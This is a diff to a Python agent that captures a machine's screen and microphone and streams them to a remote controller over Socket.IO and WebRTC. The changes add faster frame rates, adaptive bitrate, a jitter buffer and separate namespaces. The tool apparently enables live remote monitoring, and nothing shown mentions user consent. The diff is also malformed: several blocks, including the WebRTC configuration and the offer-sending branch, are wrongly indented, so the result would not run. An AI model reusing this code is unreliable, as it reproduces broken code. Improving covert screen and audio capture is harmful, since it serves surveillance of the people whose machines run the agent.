@@ -657,9 +657,9 @@ STREAM_THREADS = []
 STREAM_THREAD = None
 capture_queue = None
 encode_queue = None
-TARGET_FPS = 15
-CAPTURE_QUEUE_SIZE = 5
-ENCODE_QUEUE_SIZE = 5
+TARGET_FPS = 30
+CAPTURE_QUEUE_SIZE = 3
+ENCODE_QUEUE_SIZE = 3
 
 # Audio streaming variables
 AUDIO_STREAMING_ENABLED = False
@@ -727,59 +727,64 @@ CHUNK = 1024
 CHANNELS = 1
 RATE = 44100
 
-# WebRTC streaming variables
-WEBRTC_ENABLED = False
-WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
-WEBRTC_STREAMS = {}  # agent_id -> MediaStreamTrack
+    # WebRTC streaming variables
+    WEBRTC_ENABLED = False
+    WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
+    WEBRTC_STREAMS = {}  # agent_id -> MediaStreamTrack
 WEBRTC_SIGNALING_QUEUE = queue.Queue()
 WEBRTC_ICE_SERVERS = [
     {"urls": ["stun:stun.l.google.com:19302"]},
     {"urls": ["stun:stun1.l.google.com:19302"]}
 ]
-WEBRTC_CONFIG = {
-    'enabled': AIORTC_AVAILABLE,
-    'ice_servers': [
-        {'urls': 'stun:stun.l.google.com:19302'},
-        {'urls': 'stun:stun1.l.google.com:19302'},
-        {'urls': 'stun:stun2.l.google.com:19302'},
-        {'urls': 'stun:stun3.l.google.com:19302'},
-        {'urls': 'stun:stun4.l.google.com:19302'}
-    ],
-    'codecs': {
-        'video': ['VP8', 'VP9', 'H.264'],
-        'audio': ['Opus', 'PCM']
-    },
-    'simulcast': True,
-    'svc': True,
-    'bandwidth_estimation': True,
-    'adaptive_bitrate': True,
-    'frame_dropping': True,
-    'quality_levels': {
-        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
-        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
-        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
-        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
-    },
-    'performance_tuning': {
-        'keyframe_interval': 2,  # seconds
-        'disable_b_frames': True,
-        'ultra_low_latency': True,
-        'hardware_acceleration': True,
-        'gop_size': 60,  # frames at 30fps = 2 seconds
-        'max_bitrate_variance': 0.3  # 30% variance allowed
-    },
-    'monitoring': {
-        'connection_quality_metrics': True,
-        'automatic_reconnection': True,
-        'detailed_logging': True,
-        'stats_interval': 1000,  # ms
-        'quality_thresholds': {
-            'min_bitrate': 100000,  # 100 kbps
-            'max_latency': 1000,    # 1 second
-            'min_fps': 15
+    WEBRTC_CONFIG = {
+        'enabled': AIORTC_AVAILABLE,
+        'ice_servers': [
+            {'urls': 'stun:stun.l.google.com:19302'},
+            {'urls': 'stun:stun1.l.google.com:19302'},
+            {'urls': 'stun:stun2.l.google.com:19302'},
+            {'urls': 'stun:stun3.l.google.com:19302'},
+            {'urls': 'stun:stun4.l.google.com:19302'}
+        ],
+        'rtc_configuration': {
+            # Ensure UDP SRTP (DTLS/SRTP over UDP)
+            'bundlePolicy': 'max-bundle',
+            'rtcpMuxPolicy': 'require'
+        },
+        'codecs': {
+            'video': ['VP8', 'VP9', 'H.264'],
+            'audio': ['Opus', 'PCM']
+        },
+        'simulcast': True,
+        'svc': True,
+        'bandwidth_estimation': True,
+        'adaptive_bitrate': True,
+        'frame_dropping': True,
+        'quality_levels': {
+            'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
+            'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
+            'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
+            'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
+        },
+        'performance_tuning': {
+            'keyframe_interval': 2,  # seconds
+            'disable_b_frames': True,
+            'ultra_low_latency': True,
+            'hardware_acceleration': True,
+            'gop_size': 60,  # frames at 30fps = 2 seconds
+            'max_bitrate_variance': 0.3  # 30% variance allowed
+        },
+        'monitoring': {
+            'connection_quality_metrics': True,
+            'automatic_reconnection': True,
+            'detailed_logging': True,
+            'stats_interval': 100,  # ms (10x per second)
+            'quality_thresholds': {
+                'min_bitrate': 100000,  # 100 kbps
+                'max_latency': 120,     # ms
+                'min_fps': 30
+            }
         }
     }
-}
 
 # Module availability flags (already set above based on actual imports - removing duplicates)
 
@@ -5263,22 +5268,23 @@ def audio_send_worker(agent_id):
         return
     
     while AUDIO_STREAMING_ENABLED:
-        try:
-            # Get encoded data from encode queue
             try:
-                encoded_data = audio_encode_queue.get(timeout=0.1)
-            except queue.Empty:
-                continue
-            
-            # Send via socket.io (binary data is automatically detected)
-            try:
-                sio.emit('audio_frame', {
-                    'agent_id': agent_id,
-                    'frame': encoded_data
-                })
-            except Exception as e:
-                log_message(f"Audio send error: {e}")
-                time.sleep(0.01)
+                # Get encoded data from encode queue
+                try:
+                    encoded_data = audio_encode_queue.get(timeout=0.1)
+                except queue.Empty:
+                    continue
+
+                # Send via socket.io (binary data is automatically detected)
+                try:
+                    namespace = '/audio' if hasattr(sio, 'namespaces') and '/audio' in getattr(sio, 'namespaces', []) else None
+                    sio.emit('audio_frame', {
+                        'agent_id': agent_id,
+                        'frame': encoded_data
+                    }, namespace=namespace, compress=False)
+                except Exception as e:
+                    log_message(f"Audio send error: {e}")
+                    time.sleep(0.01)
                 
         except Exception as e:
             log_message(f"Audio sending error: {e}")
@@ -5490,19 +5496,35 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
         return None
     
     try:
-        # Create peer connection with optimized configuration
-        pc = RTCPeerConnection(configuration=WEBRTC_CONFIG)
+        # Create peer connection with optimized configuration (UDP SRTP)
+        try:
+            from aiortc import RTCConfiguration, RTCIceServer
+            rtc_conf = RTCConfiguration(iceServers=[RTCIceServer(urls=s['urls']) for s in WEBRTC_CONFIG['ice_servers']])
+        except Exception:
+            rtc_conf = None
+        pc = RTCPeerConnection(configuration=rtc_conf or WEBRTC_CONFIG)
         
         # Add media tracks
         if enable_screen:
             screen_track = ScreenTrack(agent_id, target_fps=30, quality=85)
-            pc.addTrack(screen_track)
+            sender = pc.addTrack(screen_track)
             WEBRTC_STREAMS[f"{agent_id}_screen"] = screen_track
             log_message(f"Added screen track to WebRTC connection for agent {agent_id}")
+            # Enable scalable video coding and initial bitrate hint
+            try:
+                from aiortc.rtp import RTCRtpEncodingParameters
+                params = sender.getParameters()
+                if not getattr(params, 'encodings', None):
+                    params.encodings = [RTCRtpEncodingParameters()]
+                for enc in params.encodings:
+                    enc.maxBitrate = WEBRTC_CONFIG['quality_levels']['medium']['bitrate']
+                await sender.setParameters(params)
+            except Exception as e:
+                log_message(f"Could not set initial video sender parameters: {e}")
         
         if enable_audio:
             audio_track = AudioTrack(agent_id, sample_rate=44100, channels=1)
-            pc.addTrack(audio_track)
+            audio_sender = pc.addTrack(audio_track)
             WEBRTC_STREAMS[f"{agent_id}_audio"] = audio_track
             log_message(f"Added audio track to WebRTC connection for agent {agent_id}")
         
@@ -5531,6 +5553,60 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
             log_message(f"ICE gathering state: {pc.iceGatheringState} for agent {agent_id}")
         
         log_message(f"WebRTC peer connection created successfully for agent {agent_id}")
+        
+        # Start adaptive bitrate controller task
+        async def bitrate_controller():
+            # Adjust ~10x per second like Messenger
+            good_network = True
+            last_rtt_ms = None
+            while agent_id in WEBRTC_PEER_CONNECTIONS:
+                try:
+                    # Gather stats
+                    report = await pc.getStats()
+                    # Simple heuristics: use RTT and outbound packet loss
+                    rtt_ms = None
+                    packets_lost = 0
+                    packets_sent = 0
+                    for stat in report.values():
+                        if getattr(stat, 'type', '') == 'candidate-pair' and getattr(stat, 'selected', False):
+                            rtt_ms = getattr(stat, 'currentRtt', None)
+                            if rtt_ms is not None:
+                                rtt_ms *= 1000.0
+                        if getattr(stat, 'type', '') == 'outbound-rtp':
+                            packets_lost += getattr(stat, 'packetsLost', 0) or 0
+                            packets_sent += getattr(stat, 'packetsSent', 0) or 0
+                    loss_ratio = (packets_lost / max(1, packets_sent)) if packets_sent else 0
+                    # Determine network quality
+                    good_network = (rtt_ms is not None and rtt_ms < 120) and loss_ratio < 0.02
+            # Update video sender bitrate (audio-first scheduling: skip if audio backlog)
+                    try:
+                        for sender in pc.getSenders():
+                            track = sender.track
+                            if track and getattr(track, 'kind', '') == 'video':
+                                # If audio queue is building up, deprioritize video bitrate
+                                try:
+                                    audio_track = WEBRTC_STREAMS.get(f"{agent_id}_audio")
+                                    audio_backlog = bool(audio_track and hasattr(audio_track, 'audio_queue') and audio_track.audio_queue.qsize() > 0)
+                                except Exception:
+                                    audio_backlog = False
+                                from aiortc.rtp import RTCRtpEncodingParameters
+                                params = sender.getParameters()
+                                if not getattr(params, 'encodings', None):
+                                    params.encodings = [RTCRtpEncodingParameters()]
+                                for enc in params.encodings:
+                                    enc.maxBitrate = 2_000_000 if audio_backlog else (3_000_000 if good_network else 500_000)
+                                await sender.setParameters(params)
+                    except Exception:
+                        # Ignore transient setParameters failures
+                        pass
+                except Exception:
+                    pass
+                await asyncio.sleep(0.1)
+        
+        try:
+            asyncio.create_task(bitrate_controller())
+        except Exception:
+            pass
         return pc
         
     except Exception as e:
@@ -5658,14 +5734,16 @@ def start_webrtc_streaming(agent_id, enable_screen=True, enable_audio=True, enab
                 offer = await create_webrtc_offer(agent_id)
                 if offer:
                     # Send offer to controller via Socket.IO
-                    if SOCKETIO_AVAILABLE:
+        if SOCKETIO_AVAILABLE:
+                        # Use distinct namespaces for audio/video if configured by controller
+                        namespace = '/webrtc' if hasattr(sio, 'namespaces') and '/webrtc' in getattr(sio, 'namespaces', []) else None
                         sio.emit('webrtc_offer', {
                             'agent_id': agent_id,
                             'offer_sdp': offer.sdp,
                             'enable_screen': enable_screen,
                             'enable_audio': enable_audio,
                             'enable_camera': enable_camera
-                        })
+                        }, namespace=namespace)
                         log_message(f"WebRTC offer sent to controller for agent {agent_id}")
                         return True
         
@@ -8726,6 +8804,9 @@ class ScreenTrack(MediaStreamTrack):
         self.frame_interval = 1.0 / target_fps
         self.last_frame_time = 0
         self.capture = None
+        # 2-3 frame jitter buffer for smoother playback
+        self.frame_queue = queue.Queue(maxsize=3)
+        self.next_frame_time = time.time()
         self.stats = {
             'frames_sent': 0,
             'total_bytes': 0,
@@ -8757,17 +8838,17 @@ class ScreenTrack(MediaStreamTrack):
             return frame
         
         try:
-            current_time = time.time()
-            
-            # Control frame rate
-            if current_time - self.last_frame_time < self.frame_interval:
-                await asyncio.sleep(0.001)  # Brief pause
-                return await self.recv()
-            
+            # Framerate control using target schedule
+            now = time.time()
+            if now < self.next_frame_time:
+                await asyncio.sleep(self.next_frame_time - now)
+            self.next_frame_time += 1.0 / max(1, self.target_fps)
+
             # Capture screen frame
             if MSS_AVAILABLE and hasattr(self.capture, 'grab'):
                 # Use mss for screen capture
-                monitor = self.capture.monitors[1]  # Primary monitor
+                monitor_index = 1 if len(self.capture.monitors) > 1 else 0
+                monitor = self.capture.monitors[monitor_index]
                 screenshot = self.capture.grab(monitor)
                 img_array = np.array(screenshot)
                 
@@ -8790,13 +8871,26 @@ class ScreenTrack(MediaStreamTrack):
             # Create VideoFrame for aiortc
             frame = av.VideoFrame.from_ndarray(img_array, format="bgr24")
             frame.pts, frame.time_base = await self.next_timestamp()
-            
+
+            # Jitter buffer: enqueue, then dequeue for rendering
+            try:
+                if self.frame_queue.full():
+                    _ = self.frame_queue.get_nowait()
+                self.frame_queue.put_nowait(frame)
+            except queue.Full:
+                pass
+
+            try:
+                frame_out = self.frame_queue.get_nowait()
+            except queue.Empty:
+                frame_out = frame
+
             # Update stats
             self.stats['frames_sent'] += 1
-            self.stats['fps'] = 1.0 / (current_time - self.last_frame_time) if self.last_frame_time > 0 else 0
-            self.last_frame_time = current_time
-            
-            return frame
+            self.stats['fps'] = self.target_fps
+            self.last_frame_time = time.time()
+
+            return frame_out
             
         except Exception as e:
             log_message(f"Error in ScreenTrack.recv: {e}", "error")
@@ -11923,7 +12017,8 @@ def screen_send_worker(agent_id):
             # Encode frame as base64 data URL for browser display
             frame_b64 = base64.b64encode(frame).decode('utf-8')
             frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
-            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame_data_url})
+            namespace = '/video' if hasattr(sio, 'namespaces') and '/video' in getattr(sio, 'namespaces', []) else None
+            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame_data_url}, namespace=namespace, compress=True)
         except Exception as e:
             log_message(f"SocketIO send error: {e}", "error")
 
